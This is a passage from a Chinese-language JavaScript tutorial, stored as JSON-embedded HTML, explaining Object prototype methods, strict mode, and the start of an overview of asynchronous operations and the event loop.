language-javascript\"><code>Object.prototype.isPrototypeOf({}) // true\nObject.prototype.isPrototypeOf([]) // true\nObject.prototype.isPrototypeOf(/xyz/) // true\nObject.prototype.isPrototypeOf(Object.create(null)) // false</code></pre><p>上面代码中，由于<code>Object.prototype</code>处于原型链的最顶端，所以对各种实例都返回<code>true</code>，只有直接继承自<code>null</code>的对象除外。</p>\n\n        <h2>\n            <a href='#Object.prototype.__proto__' class='header-anchor'>#</a>\n            <span>Object.prototype.__proto__</span>\n        </h2>\n    <p>实例对象的<code>__proto__</code>属性（前后各两个下划线），返回该对象的原型。该属性可读写。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nvar p = {};\n\nobj.__proto__ = p;\nObject.getPrototypeOf(obj) === p // true</code></pre><p>上面代码通过<code>__proto__</code>属性，将<code>p</code>对象设为<code>obj</code>对象的原型。</p>\n<p>根据语言标准，<code>__proto__</code>属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用<code>Object.getPrototypeof()</code>和<code>Object.setPrototypeOf()</code>，进行原型对象的读写操作。</p>\n<p>原型链可以用<code>__proto__</code>很直观地表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var A = {\n  name: &#039;张三&#039;\n};\nvar B = {\n  name: &#039;李四&#039;\n};\n\nvar proto = {\n  print: function () {\n    console.log(this.name);\n  }\n};\n\nA.__proto__ = proto;\nB.__proto__ = proto;\n\nA.print() // 张三\nB.print() // 李四\n\nA.print === B.print // true\nA.print === proto.print // true\nB.print === proto.print // true</code></pre><p>上面代码中，<code>A</code>对象和<code>B</code>对象的原型都是<code>proto</code>对象，它们都共享<code>proto</code>对象的<code>print</code>方法。也就是说，<code>A</code>和<code>B</code>的<code>print</code>方法，都是在调用<code>proto</code>对象的<code>print</code>方法。</p>\n\n        <h2>\n            <a href='#获取原型对象方法的比较' class='header-anchor'>#</a>\n            <span>获取原型对象方法的比较</span>\n        </h2>\n    <p>如前所述，<code>__proto__</code>属性指向当前对象的原型对象，即构造函数的<code>prototype</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nobj.__proto__ === Object.prototype\n// true\nobj.__proto__ === obj.constructor.prototype\n// true</code></pre><p>上面代码首先新建了一个对象<code>obj</code>，它的<code>__proto__</code>属性，指向构造函数（<code>Object</code>或<code>obj.constructor</code>）的<code>prototype</code>属性。</p>\n<p>因此，获取实例对象<code>obj</code>的原型对象，有三种方法。</p>\n<ul>\n<li><code>obj.__proto__</code></li>\n<li><code>obj.constructor.prototype</code></li>\n<li><code>Object.getPrototypeOf(obj)</code></li>\n</ul>\n<p>上面三种方法之中，前两种都不是很可靠。<code>__proto__</code>属性只有浏览器才需要部署，其他环境可以不部署。而<code>obj.constructor.prototype</code>在手动改变原型对象时，可能会失效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var P = function () {};\nvar p = new P();\n\nvar C = function () {};\nC.prototype = p;\nvar c = new C();\n\nc.constructor.prototype === p // false</code></pre><p>上面代码中，构造函数<code>C</code>的原型对象被改成了<code>p</code>，但是实例对象的<code>c.constructor.prototype</code>却没有指向<code>p</code>。所以，在改变原型对象时，一般要同时设置<code>constructor</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>C.prototype = p;\nC.prototype.constructor = C;\n\nvar c = new C();\nc.constructor.prototype === p // true</code></pre><p>因此，推荐使用第三种<code>Object.getPrototypeOf</code>方法，获取原型对象。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyNames()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyNames</code>方法返回一个数组，成员是参数对象本身的所有属性的键名，不包含继承的属性键名。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.getOwnPropertyNames(Date)\n// [&quot;parse&quot;, &quot;arguments&quot;, &quot;UTC&quot;, &quot;caller&quot;, &quot;name&quot;, &quot;prototype&quot;, &quot;now&quot;, &quot;length&quot;]</code></pre><p>上面代码中，<code>Object.getOwnPropertyNames</code>方法返回<code>Date</code>所有自身的属性名。</p>\n<p>对象本身的属性之中，有的是可以遍历的（enumerable），有的是不可以遍历的。<code>Object.getOwnPropertyNames</code>方法返回所有键名，不管是否可以遍历。只获取那些可以遍历的属性，使用<code>Object.keys</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.keys(Date) // []</code></pre><p>上面代码表明，<code>Date</code>对象所有自身的属性，都是不可以遍历的。</p>\n\n        <h2>\n            <a href='#Object.prototype.hasOwnProperty()' class='header-anchor'>#</a>\n            <span>Object.prototype.hasOwnProperty()</span>\n        </h2>\n    <p>对象实例的<code>hasOwnProperty</code>方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.hasOwnProperty(&#039;length&#039;) // true\nDate.hasOwnProperty(&#039;toString&#039;) // false</code></pre><p>上面代码表明，<code>Date.length</code>（构造函数<code>Date</code>可以接受多少个参数）是<code>Date</code>自身的属性，<code>Date.toString</code>是继承的属性。</p>\n<p>另外，<code>hasOwnProperty</code>方法是 JavaScript 之中唯一一个处理对象属性时，不会遍历原型链的方法。</p>\n\n        <h2>\n            <a href='#in-运算符和-for...in-循环' class='header-anchor'>#</a>\n            <span>in 运算符和 for...in 循环</span>\n        </h2>\n    <p><code>in</code>运算符返回一个布尔值，表示一个对象是否具有某个属性。它不区分该属性是对象自身的属性，还是继承的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;length&#039; in Date // true\n&#039;toString&#039; in Date // true</code></pre><p><code>in</code>运算符常用于检查一个属性是否存在。</p>\n<p>获得对象的所有可遍历属性（不管是自身的还是继承的），可以使用<code>for...in</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = { p1: 123 };\n\nvar o2 = Object.create(o1, {\n  p2: { value: &quot;abc&quot;, enumerable: true }\n});\n\nfor (p in o2) {\n  console.info(p);\n}\n// p2\n// p1</code></pre><p>上面代码中，对象<code>o2</code>的<code>p2</code>属性是自身的，<code>p1</code>属性是继承的。这两个属性都会被<code>for...in</code>循环遍历。</p>\n<p>为了在<code>for...in</code>循环中获得对象自身的属性，可以采用<code>hasOwnProperty</code>方法判断一下。</p>\n<pre class=\"prettyprint language-javascript\"><code>for ( var name in object ) {\n  if ( object.hasOwnProperty(name) ) {\n    /* loop code */\n  }\n}</code></pre><p>获得对象的所有属性（不管是自身的还是继承的，也不管是否可枚举），可以使用下面的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function inheritedPropertyNames(obj) {\n  var props = {};\n  while(obj) {\n    Object.getOwnPropertyNames(obj).forEach(function(p) {\n      props[p] = true;\n    });\n    obj = Object.getPrototypeOf(obj);\n  }\n  return Object.getOwnPropertyNames(props);\n}</code></pre><p>上面代码依次获取<code>obj</code>对象的每一级原型对象“自身”的属性，从而获取<code>obj</code>对象的“所有”属性，不管是否可遍历。</p>\n<p>下面是一个例子，列出<code>Date</code>对象的所有属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>inheritedPropertyNames(Date)\n// [\n//  &quot;caller&quot;,\n//  &quot;constructor&quot;,\n//  &quot;toString&quot;,\n//  &quot;UTC&quot;,\n//  ...\n// ]</code></pre>\n        <h2>\n            <a href='#对象的拷贝' class='header-anchor'>#</a>\n            <span>对象的拷贝</span>\n        </h2>\n    <p>如果要拷贝一个对象，需要做到下面两件事情。</p>\n<ul>\n<li>确保拷贝后的对象，与原对象具有同样的原型。</li>\n<li>确保拷贝后的对象，与原对象具有同样的实例属性。</li>\n</ul>\n<p>下面就是根据上面两点，实现的对象拷贝函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function copyObject(orig) {\n  var copy = Object.create(Object.getPrototypeOf(orig));\n  copyOwnPropertiesFrom(copy, orig);\n  return copy;\n}\n\nfunction copyOwnPropertiesFrom(target, source) {\n  Object\n    .getOwnPropertyNames(source)\n    .forEach(function (propKey) {\n      var desc = Object.getOwnPropertyDescriptor(source, propKey);\n      Object.defineProperty(target, propKey, desc);\n    });\n  return target;\n}</code></pre><p>另一种更简单的写法，是利用 ES2017 才引入标准的<code>Object.getOwnPropertyDescriptors</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function copyObject(orig) {\n  return Object.create(\n    Object.getPrototypeOf(orig),\n    Object.getOwnPropertyDescriptors(orig)\n  );\n}</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/07/js-properties.html\">JavaScript properties: inheritance and enumerability</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"面向对象编程","link":"javascript:void(0)"},{"title":"Object 对象的相关方法","link":"/oop/strict.html"}],"content":"\n        <h1>\n            <a href='#严格模式' class='header-anchor'>#</a>\n            <span>严格模式</span>\n        </h1>\n    <p>除了正常的运行模式，JavaScript 还有第二种运行模式：严格模式（strict mode）。顾名思义，这种模式采用更加严格的 JavaScript 语法。</p>\n<p>同样的代码，在正常模式和严格模式中，可能会有不一样的运行结果。一些在正常模式下可以运行的语句，在严格模式下将不能运行。</p>\n\n        <h2>\n            <a href='#设计目的' class='header-anchor'>#</a>\n            <span>设计目的</span>\n        </h2>\n    <p>早期的 JavaScript 语言有很多设计不合理的地方，但是为了兼容以前的代码，又不能改变老的语法，只能不断添加新的语法，引导程序员使用新语法。</p>\n<p>严格模式是从 ES5 进入标准的，主要目的有以下几个。</p>\n<ul>\n<li>明确禁止一些不合理、不严谨的语法，减少 JavaScript 语言的一些怪异行为。</li>\n<li>增加更多报错的场合，消除代码运行的一些不安全之处，保证代码运行的安全。</li>\n<li>提高编译器效率，增加运行速度。</li>\n<li>为未来新版本的 JavaScript 语法做好铺垫。</li>\n</ul>\n<p>总之，严格模式体现了 JavaScript 更合理、更安全、更严谨的发展方向。</p>\n\n        <h2>\n            <a href='#启用方法' class='header-anchor'>#</a>\n            <span>启用方法</span>\n        </h2>\n    <p>进入严格模式的标志，是一行字符串<code>use strict</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;</code></pre><p>老版本的引擎会把它当作一行普通字符串，加以忽略。新版本的引擎就会进入严格模式。</p>\n<p>严格模式可以用于整个脚本，也可以只用于单个函数。</p>\n<p><strong>（1） 整个脚本文件</strong></p>\n<p><code>use strict</code>放在脚本文件的第一行，整个脚本都将以严格模式运行。如果这行语句不在第一行就无效，整个脚本会以正常模式运行。(严格地说，只要前面不是产生实际运行结果的语句，<code>use strict</code>可以不在第一行，比如直接跟在一个空的分号后面，或者跟在注释后面。)</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script&gt;\n  &#039;use strict&#039;;\n  console.log(&#039;这是严格模式&#039;);\n&lt;/script&gt;\n\n&lt;script&gt;\n  console.log(&#039;这是正常模式&#039;);\n&lt;/script&gt;</code></pre><p>上面代码中，一个网页文件依次有两段 JavaScript 代码。前一个<code>&lt;script&gt;</code>标签是严格模式，后一个不是。</p>\n<p>如果<code>use strict</code>写成下面这样，则不起作用，严格模式必须从代码一开始就生效。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script&gt;\n  console.log(&#039;这是正常模式&#039;);\n  &#039;use strict&#039;;\n&lt;/script&gt;</code></pre><p><strong>（2）单个函数</strong></p>\n<p><code>use strict</code>放在函数体的第一行，则整个函数以严格模式运行。</p>\n<pre class=\"prettyprint language-javascript\"><code>function strict() {\n  &#039;use strict&#039;;\n  return &#039;这是严格模式&#039;;\n}\n\nfunction strict2() {\n  &#039;use strict&#039;;\n  function f() {\n    return &#039;这也是严格模式&#039;;\n  }\n  return f();\n}\n\nfunction notStrict() {\n  return &#039;这是正常模式&#039;;\n}</code></pre><p>有时，需要把不同的脚本合并在一个文件里面。如果一个脚本是严格模式，另一个脚本不是，它们的合并就可能出错。严格模式的脚本在前，则合并后的脚本都是严格模式；如果正常模式的脚本在前，则合并后的脚本都是正常模式。这两种情况下，合并后的结果都是不正确的。这时可以考虑把整个脚本文件放在一个立即执行的匿名函数之中。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function () {\n  &#039;use strict&#039;;\n  // some code here\n})();</code></pre>\n        <h2>\n            <a href='#显式报错' class='header-anchor'>#</a>\n            <span>显式报错</span>\n        </h2>\n    <p>严格模式使得 JavaScript 的语法变得更严格，更多的操作会显式报错。其中有些操作，在正常模式下只会默默地失败，不会报错。</p>\n\n        <h3>\n            <a href='#只读属性不可写' class='header-anchor'>#</a>\n            <span>只读属性不可写</span>\n        </h3>\n    <p>严格模式下，设置字符串的<code>length</code>属性，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\n&#039;abc&#039;.length = 5;\n// TypeError: Cannot assign to read only property &#039;length&#039; of string &#039;abc&#039;</code></pre><p>上面代码报错，因为<code>length</code>是只读属性，严格模式下不可写。正常模式下，改变<code>length</code>属性是无效的，但不会报错。</p>\n<p>严格模式下，对只读属性赋值，或者删除不可配置（non-configurable）属性都会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 对只读属性赋值会报错\n&#039;use strict&#039;;\nObject.defineProperty({}, &#039;a&#039;, {\n  value: 37,\n  writable: false\n});\nobj.a = 123;\n// TypeError: Cannot assign to read only property &#039;a&#039; of object #&lt;Object&gt;\n\n// 删除不可配置的属性会报错\n&#039;use strict&#039;;\nvar obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 1,\n  configurable: false\n});\ndelete obj.p\n// TypeError: Cannot delete property &#039;p&#039; of #&lt;Object&gt;</code></pre>\n        <h3>\n            <a href='#只设置了取值器的属性不可写' class='header-anchor'>#</a>\n            <span>只设置了取值器的属性不可写</span>\n        </h3>\n    <p>严格模式下，对一个只有取值器（getter）、没有存值器（setter）的属性赋值，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar obj = {\n  get v() { return 1; }\n};\nobj.v = 2;\n// Uncaught TypeError: Cannot set property v of #&lt;Object&gt; which has only a getter</code></pre><p>上面代码中，<code>obj.v</code>只有取值器，没有存值器，对它进行赋值就会报错。</p>\n\n        <h3>\n            <a href='#禁止扩展的对象不可扩展' class='header-anchor'>#</a>\n            <span>禁止扩展的对象不可扩展</span>\n        </h3>\n    <p>严格模式下，对禁止扩展的对象添加新属性，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar obj = {};\nObject.preventExtensions(obj);\nobj.v = 1;\n// Uncaught TypeError: Cannot add property v, object is not extensible</code></pre><p>上面代码中，<code>obj</code>对象禁止扩展，添加属性就会报错。</p>\n\n        <h3>\n            <a href='#eval、arguments-不可用作标识名' class='header-anchor'>#</a>\n            <span>eval、arguments 不可用作标识名</span>\n        </h3>\n    <p>严格模式下，使用<code>eval</code>或者<code>arguments</code>作为标识名，将会报错。下面的语句都会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar eval = 17;\nvar arguments = 17;\nvar obj = { set p(arguments) { } };\ntry { } catch (arguments) { }\nfunction x(eval) { }\nfunction arguments() { }\nvar y = function eval() { };\nvar f = new Function(&#039;arguments&#039;, &quot;&#039;use strict&#039;; return 17;&quot;);\n// SyntaxError: Unexpected eval or arguments in strict mode</code></pre>\n        <h3>\n            <a href='#函数不能有重名的参数' class='header-anchor'>#</a>\n            <span>函数不能有重名的参数</span>\n        </h3>\n    <p>正常模式下，如果函数有多个重名的参数，可以用<code>arguments[i]</code>读取。严格模式下，这属于语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a, b) {\n  &#039;use strict&#039;;\n  return a + b;\n}\n// Uncaught SyntaxError: Duplicate parameter name not allowed in this context</code></pre>\n        <h3>\n            <a href='#禁止八进制的前缀0表示法' class='header-anchor'>#</a>\n            <span>禁止八进制的前缀0表示法</span>\n        </h3>\n    <p>正常模式下，整数的第一位如果是<code>0</code>，表示这是八进制数，比如<code>0100</code>等于十进制的64。严格模式禁止这种表示法，整数第一位为<code>0</code>，将报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar n = 0100;\n// Uncaught SyntaxError: Octal literals are not allowed in strict mode.</code></pre>\n        <h2>\n            <a href='#增强的安全措施' class='header-anchor'>#</a>\n            <span>增强的安全措施</span>\n        </h2>\n    <p>严格模式增强了安全保护，从语法上防止了一些不小心会出现的错误。</p>\n\n        <h3>\n            <a href='#全局变量显式声明' class='header-anchor'>#</a>\n            <span>全局变量显式声明</span>\n        </h3>\n    <p>正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\n\nv = 1; // 报错，v未声明\n\nfor (i = 0; i &lt; 2; i++) { // 报错，i 未声明\n  // ...\n}\n\nfunction f() {\n  x = 123;\n}\nf() // 报错，未声明就创建一个全局变量</code></pre><p>因此，严格模式下，变量都必须先声明，然后再使用。</p>\n\n        <h3>\n            <a href='#禁止-this-关键字指向全局对象' class='header-anchor'>#</a>\n            <span>禁止 this 关键字指向全局对象</span>\n        </h3>\n    <p>正常模式下，函数内部的<code>this</code>可能会指向全局对象，严格模式禁止这种用法，避免无意间创造全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 正常模式\nfunction f() {\n  console.log(this === window);\n}\nf() // true\n\n// 严格模式\nfunction f() {\n  &#039;use strict&#039;;\n  console.log(this === undefined);\n}\nf() // true</code></pre><p>上面代码中，严格模式的函数体内部<code>this</code>是<code>undefined</code>。</p>\n<p>这种限制对于构造函数尤其有用。使用构造函数时，有时忘了加<code>new</code>，这时<code>this</code>不再指向全局对象，而是报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  &#039;use strict&#039;;\n  this.a = 1;\n};\n\nf();// 报错，this 未定义</code></pre><p>严格模式下，函数直接调用时（不使用<code>new</code>调用），函数内部的<code>this</code>表示<code>undefined</code>（未定义），因此可以用<code>call</code>、<code>apply</code>和<code>bind</code>方法，将任意值绑定在<code>this</code>上面。正常模式下，<code>this</code>指向全局对象，如果绑定的值是非对象，将被自动转为对象再绑定上去，而<code>null</code>和<code>undefined</code>这两个无法转成对象的值，将被忽略。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 正常模式\nfunction fun() {\n  return this;\n}\n\nfun() // window\nfun.call(2) // Number {2}\nfun.call(true) // Boolean {true}\nfun.call(null) // window\nfun.call(undefined) // window\n\n// 严格模式\n&#039;use strict&#039;;\nfunction fun() {\n  return this;\n}\n\nfun() //undefined\nfun.call(2) // 2\nfun.call(true) // true\nfun.call(null) // null\nfun.call(undefined) // undefined</code></pre><p>上面代码中，可以把任意类型的值，绑定在<code>this</code>上面。</p>\n\n        <h3>\n            <a href='#禁止使用-fn.callee、fn.caller' class='header-anchor'>#</a>\n            <span>禁止使用 fn.callee、fn.caller</span>\n        </h3>\n    <p>函数内部不得使用<code>fn.caller</code>、<code>fn.arguments</code>，否则会报错。这意味着不能在函数内部得到调用栈了。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  &#039;use strict&#039;;\n  f1.caller;    // 报错\n  f1.arguments; // 报错\n}\n\nf1();</code></pre>\n        <h3>\n            <a href='#禁止使用-arguments.callee、arguments.caller' class='header-anchor'>#</a>\n            <span>禁止使用 arguments.callee、arguments.caller</span>\n        </h3>\n    <p><code>arguments.callee</code>和<code>arguments.caller</code>是两个历史遗留的变量，从来没有标准化过，现在已经取消了。正常模式下调用它们没有什么作用，但是不会报错。严格模式明确规定，函数内部使用<code>arguments.callee</code>、<code>arguments.caller</code>将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar f = function () {\n  return arguments.callee;\n};\n\nf(); // 报错</code></pre>\n        <h3>\n            <a href='#禁止删除变量' class='header-anchor'>#</a>\n            <span>禁止删除变量</span>\n        </h3>\n    <p>严格模式下无法删除变量，如果使用<code>delete</code>命令删除一个变量，会报错。只有对象的属性，且属性的描述对象的<code>configurable</code>属性设置为<code>true</code>，才能被<code>delete</code>命令删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar x;\ndelete x; // 语法错误\n\nvar obj = Object.create(null, {\n  x: {\n    value: 1,\n    configurable: true\n  }\n});\ndelete obj.x; // 删除成功</code></pre>\n        <h2>\n            <a href='#静态绑定' class='header-anchor'>#</a>\n            <span>静态绑定</span>\n        </h2>\n    <p>JavaScript 语言的一个特点，就是允许“动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。</p>\n<p>严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，必须在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。</p>\n<p>具体来说，涉及以下几个方面。</p>\n\n        <h3>\n            <a href='#禁止使用-with-语句' class='header-anchor'>#</a>\n            <span>禁止使用 with 语句</span>\n        </h3>\n    <p>严格模式下，使用<code>with</code>语句将报错。因为<code>with</code>语句无法在编译时就确定，某个属性到底归属哪个对象，从而影响了编译效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nvar v  = 1;\nvar obj = {};\n\nwith (obj) {\n  v = 2;\n}\n// Uncaught SyntaxError: Strict mode code may not include a with statement</code></pre>\n        <h3>\n            <a href='#创设-eval-作用域' class='header-anchor'>#</a>\n            <span>创设 eval 作用域</span>\n        </h3>\n    <p>正常模式下，JavaScript 语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域：<code>eval</code>作用域。</p>\n<p>正常模式下，<code>eval</code>语句的作用域，取决于它处于全局作用域，还是函数作用域。严格模式下，<code>eval</code>语句本身就是一个作用域，不再能够在其所运行的作用域创设新的变量了，也就是说，<code>eval</code>所生成的变量只能用于<code>eval</code>内部。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function () {\n  &#039;use strict&#039;;\n  var x = 2;\n  console.log(eval(&#039;var x = 5; x&#039;)) // 5\n  console.log(x) // 2\n})()</code></pre><p>上面代码中，由于<code>eval</code>语句内部是一个独立作用域，所以内部的变量<code>x</code>不会泄露到外部。</p>\n<p>注意，如果希望<code>eval</code>语句也使用严格模式，有两种方式。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 方式一\nfunction f1(str){\n  &#039;use strict&#039;;\n  return eval(str);\n}\nf1(&#039;undeclared_variable = 1&#039;); // 报错\n\n// 方式二\nfunction f2(str){\n  return eval(str);\n}\nf2(&#039;&quot;use strict&quot;;undeclared_variable = 1&#039;)  // 报错</code></pre><p>上面两种写法，<code>eval</code>内部使用的都是严格模式。</p>\n\n        <h3>\n            <a href='#arguments-不再追踪参数的变化' class='header-anchor'>#</a>\n            <span>arguments 不再追踪参数的变化</span>\n        </h3>\n    <p>变量<code>arguments</code>代表函数的参数。严格模式下，函数内部改变参数与<code>arguments</code>的联系被切断了，两者不再存在联动关系。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a) {\n  a = 2;\n  return [a, arguments[0]];\n}\nf(1); // 正常模式为[2, 2]\n\nfunction f(a) {\n  &#039;use strict&#039;;\n  a = 2;\n  return [a, arguments[0]];\n}\nf(1); // 严格模式为[2, 1]</code></pre><p>上面代码中，改变函数的参数，不会反应到<code>arguments</code>对象上来。</p>\n\n        <h2>\n            <a href='#向下一个版本的-JavaScript-过渡' class='header-anchor'>#</a>\n            <span>向下一个版本的 JavaScript 过渡</span>\n        </h2>\n    <p>JavaScript语言的下一个版本是 ECMAScript 6，为了平稳过渡，严格模式引入了一些 ES6 语法。</p>\n\n        <h3>\n            <a href='#非函数代码块不得声明函数' class='header-anchor'>#</a>\n            <span>非函数代码块不得声明函数</span>\n        </h3>\n    <p>ES6 会引入块级作用域。为了与新版本接轨，ES5 的严格模式只允许在全局作用域或函数作用域声明函数。也就是说，不允许在非函数的代码块内声明函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;use strict&#039;;\nif (true) {\n  function f1() { } // 语法错误\n}\n\nfor (var i = 0; i &lt; 5; i++) {\n  function f2() { } // 语法错误\n}</code></pre><p>上面代码在<code>if</code>代码块和<code>for</code>代码块中声明了函数，ES5 环境会报错。</p>\n<p>注意，如果是 ES6 环境，上面的代码不会报错，因为 ES6 允许在代码块之中声明函数。</p>\n\n        <h3>\n            <a href='#保留字' class='header-anchor'>#</a>\n            <span>保留字</span>\n        </h3>\n    <p>为了向将来 JavaScript 的新版本过渡，严格模式新增了一些保留字（implements、interface、let、package、private、protected、public、static、yield等）。使用这些词作为变量名将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>function package(protected) { // 语法错误\n  &#039;use strict&#039;;\n  var implements; // 语法错误\n}</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>MDN, <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/Strict_mode\">Strict mode</a></li>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/10/strict-mode-hatred.html\">JavaScript: Why the hatred for strict mode?</a></li>\n<li>Dr. Axel Rauschmayer，<a href=\"http://www.2ality.com/2011/01/javascripts-strict-mode-summary.html\">JavaScript’s strict mode: a summary</a></li>\n<li>Douglas Crockford, <a href=\"http://www.yuiblog.com/blog/2010/12/14/strict-mode-is-coming-to-town/\">Strict Mode Is Coming To Town</a></li>\n<li><a href=\"http://java-script.limewebs.com/strictMode/test_hosted.html\">JavaScript Strict Mode Support</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"异步操作","link":"javascript:void(0)"},{"title":"概述","link":"/async/general.html"}],"content":"\n        <h1>\n            <a href='#异步操作概述' class='header-anchor'>#</a>\n            <span>异步操作概述</span>\n        </h1>\n    \n        <h2>\n            <a href='#单线程模型' class='header-anchor'>#</a>\n            <span>单线程模型</span>\n        </h2>\n    <p>单线程模型指的是，JavaScript 只在一个线程上运行。也就是说，JavaScript 同时只能执行一个任务，其他任务都必须在后面排队等待。</p>\n<p>注意，JavaScript 只在一个线程上运行，不代表 JavaScript 引擎只有一个线程。事实上，JavaScript 引擎有多个线程，单个脚本只能在一个线程上运行（称为主线程），其他线程都是在后台配合。</p>\n<p>JavaScript 之所以采用单线程，而不是多线程，跟历史有关系。JavaScript 从诞生起就是单线程，原因是不想让浏览器变得太复杂，因为多线程需要共享资源、且有可能修改彼此的运行结果，对于一种网页脚本语言来说，这就太复杂了。如果 JavaScript 同时有两个线程，一个线程在网页 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？是不是还要有锁机制？所以，为了避免复杂性，JavaScript 一开始就是单线程，这已经成了这门语言的核心特征，将来也不会改变。</p>\n<p>这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段 JavaScript 代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。JavaScript 语言本身并不慢，慢的是读写外部数据，比如等待 Ajax 请求返回结果。这个时候，如果对方服务器迟迟没有响应，或者网络不通畅，就会导致脚本的长时间停滞。</p>\n<p>如果排队是因为计算量大，CPU 忙不过来，倒也算了，但是很多时候 CPU 是闲着的，因为 IO 操作（输入输出）很慢（比如 Ajax 操作从网络读取数据），不得不等着结果出来，再往下执行。JavaScript 语言的设计者意识到，这时 CPU 完全可以不管 IO 操作，挂起处于等待中的任务，先运行排在后面的任务。等到 IO 操作返回了结果，再回过头，把挂起的任务继续执行下去。这种机制就是 JavaScript 内部采用的“事件循环”机制（Event Loop）。</p>\n<p>单线程模型虽然对 JavaScript 构成了很大的限制，但也因此使它具备了其他语言不具备的优势。如果用得好，JavaScript 程序是不会出现堵塞的，这就是为什么 Node 可以用很少的资源，应付大流量访问的原因。</p>\n<p>为了利用多核 CPU 的计算能力，HTML5 提出 Web Worker 标准，允许 JavaScript 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 DOM。所以，这个新标准并没有改变 JavaScript 单线程的本质。</p>\n\n        <h2>\n            <a href='#同步任务和异步任务' class='header-anchor'>#</a>\n            <span>同步任务和异步任务</span>\n        </h2>\n    <p>程序里面所有的任务，可以分成两类：同步任务（synchronous）和异步任务（asynchronous）。</p>\n<p>同步任务是那些没有被引擎挂起、在主线程上排队执行的任务。只有前一个任务执行完毕，才能执行后一个任务。</p>\n<p>异步任务是那些被引擎放在一边，不进入主线程、而进入任务队列的任务。只有引擎认为某个异步任务可以执行了（比如 Ajax 操作从服务器得到了结果），该任务（采用回调函数的形式）才会进入主线程执行。排在异步任务后面的代码，不用等待异步任务结束会马上运行，也就是说，异步任务不具有”堵塞“效应。</p>\n<p>举例来说，Ajax 操作可以当作同步任务处理，也可以当作异步任务处理，由开发者决定。如果是同步任务，主线程就等着 Ajax 操作返回结果，再往下执行；如果是异步任务，主线程在发出 Ajax 请求以后，就直接往下执行，等到 Ajax 操作有了结果，主线程再执行对应的回调函数。</p>\n\n        <h2>\n            <a href='#任务队列和事件循环' class='header-anchor'>#</a>\n            <span>任务队列和事件循环</span>\n        </h2>\n    <p>JavaScript 运行时，除了一个正在运行的主线程，引擎还提供一个任务队列（task 